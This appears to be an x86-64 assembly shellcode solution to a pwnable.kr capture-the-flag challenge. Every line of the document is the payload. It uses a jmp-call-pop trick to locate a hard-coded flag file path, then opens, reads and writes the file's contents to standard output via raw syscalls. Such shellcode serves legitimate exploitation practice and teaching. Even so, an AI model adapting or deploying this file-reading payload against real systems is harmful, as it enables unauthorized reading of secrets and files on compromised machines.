global _start

section .text

_start:
	jmp file_name

open_file:
	pop rdi

	; open
	mov rsi, rsi ; flags
	mov rdx, 0 ; mode
	xor rax, rax
	mov rax, 2 ; syscall number
	syscall

	; read:
	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax ; FD
	mov rdx, 0xfff ; size
	xor rax, rax
	syscall

	; write:
	xor rdi, rdi
	mov rdi, 1 ; FD
	mov rdx, rax
	xor rax, rax
	mov rax, 1 ; syscall number
	syscall

	; exit:
	xor rax, rax
	mov rax, 60
	syscall

file_name:
	call open_file
	path: db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
